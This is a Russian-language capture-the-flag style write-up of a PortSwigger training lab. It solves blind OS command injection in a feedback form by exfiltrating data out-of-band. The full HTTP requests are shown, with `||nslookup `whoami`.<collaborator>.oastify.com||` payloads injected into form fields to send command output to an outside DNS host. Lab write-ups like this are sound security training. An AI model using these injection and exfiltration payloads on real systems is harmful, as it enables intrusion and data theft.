---
title: "Blind OS command injection with out-of-band data exfiltration"
date: 2025-06-27
tags: [injection, writeup, web]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration"
classes: wide
---

В лабе содержится уязвимость **Blind OS command injection**. Для решения необходимо отправить `DNS` запрос с сервера вместе именем пользователя.

```
https://0aae003e031cb93880ae5d9d008100bc.web-security-academy.net/
```

## Solution

Сразу перейду в форму обратной связи. Соберу запрос:

```http
POST /feedback/submit HTTP/2
Host: 0aae003e031cb93880ae5d9d008100bc.web-security-academy.net
Cookie: session=OSjLp57PhGSMTSemnKy4JtXDeog1gR8u
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aae003e031cb93880ae5d9d008100bc.web-security-academy.net/feedback
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: https://0aae003e031cb93880ae5d9d008100bc.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=1g17hIQQqURqEiesGEX4tbFKF9PrfsjW&name=name&email=mail%40mail.com&subject=subject&message=message
```

Из задачи ясно, что нужно отправлять `DNS` запросы. Поэтому буду использовать `nslookup q1seln9s2o9zzv3pfboqrt8wdnjf75vu.oastify.com`. Мне в голову пришла идея, что я могу подставить разные поддомены для полей и посмотреть, что из них сработает:

```http
POST /feedback/submit HTTP/2
Host: 0aae003e031cb93880ae5d9d008100bc.web-security-academy.net
Cookie: session=OSjLp57PhGSMTSemnKy4JtXDeog1gR8u
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aae003e031cb93880ae5d9d008100bc.web-security-academy.net/feedback
Content-Type: application/x-www-form-urlencoded
Content-Length: 355
Origin: https://0aae003e031cb93880ae5d9d008100bc.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=1g17hIQQqURqEiesGEX4tbFKF9PrfsjW&name=name||nslookup name.q1seln9s2o9zzv3pfboqrt8wdnjf75vu.oastify.com||&email=mail%40mail.com||nslookup mail.q1seln9s2o9zzv3pfboqrt8wdnjf75vu.oastify.com||&subject=subject||nslookup subject.q1seln9s2o9zzv3pfboqrt8wdnjf75vu.oastify.com||&message=message||nslookup message.q1seln9s2o9zzv3pfboqrt8wdnjf75vu.oastify.com||
```

Получил ошибку:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 33

"Name must be length 64 or less."
```

Вероятно поле `name` мне не подходит, уберу из него пейлоада:

```http
POST /feedback/submit HTTP/2
Host: 0aae003e031cb93880ae5d9d008100bc.web-security-academy.net
Cookie: session=OSjLp57PhGSMTSemnKy4JtXDeog1gR8u
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aae003e031cb93880ae5d9d008100bc.web-security-academy.net/feedback
Content-Type: application/x-www-form-urlencoded
Content-Length: 293
Origin: https://0aae003e031cb93880ae5d9d008100bc.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=1g17hIQQqURqEiesGEX4tbFKF9PrfsjW&name=name&email=mail%40mail.com||nslookup mail.q1seln9s2o9zzv3pfboqrt8wdnjf75vu.oastify.com||&subject=subject||nslookup subject.q1seln9s2o9zzv3pfboqrt8wdnjf75vu.oastify.com||&message=message||nslookup message.q1seln9s2o9zzv3pfboqrt8wdnjf75vu.oastify.com||
```

Получил следующие запросы:

![IMG](/assets/images/IMG_os_command_injection/IMG_Blind_OS_command_injection_with_out-of-band_data_exfiltration/1.png){: height="200" .align-center}

Они пришли на поддомен `mail`, значит именно это поле является уязвимым. Попробую выполнить нужную команду `whoami` с помощью следующего пейлоада:

```
||nslookup `whoami`.q1seln9s2o9zzv3pfboqrt8wdnjf75vu.oastify.com||
```

```http
POST /feedback/submit HTTP/2
Host: 0aae003e031cb93880ae5d9d008100bc.web-security-academy.net
Cookie: session=OSjLp57PhGSMTSemnKy4JtXDeog1gR8u
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aae003e031cb93880ae5d9d008100bc.web-security-academy.net/feedback
Content-Type: application/x-www-form-urlencoded
Content-Length: 167
Origin: https://0aae003e031cb93880ae5d9d008100bc.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=1g17hIQQqURqEiesGEX4tbFKF9PrfsjW&name=name&email=mail%40mail.com||nslookup `whoami`.q1seln9s2o9zzv3pfboqrt8wdnjf75vu.oastify.com||&subject=subject&message=message
```

![IMG](/assets/images/IMG_os_command_injection/IMG_Blind_OS_command_injection_with_out-of-band_data_exfiltration/2.png){: height="200" .align-center}

А вот и имя пользователя:

```
peter-fjORpg
```

Попробую сдать его:

![IMG](/assets/images/IMG_os_command_injection/IMG_Blind_OS_command_injection_with_out-of-band_data_exfiltration/3.png){: height="200" .align-center}

Лаба решена)
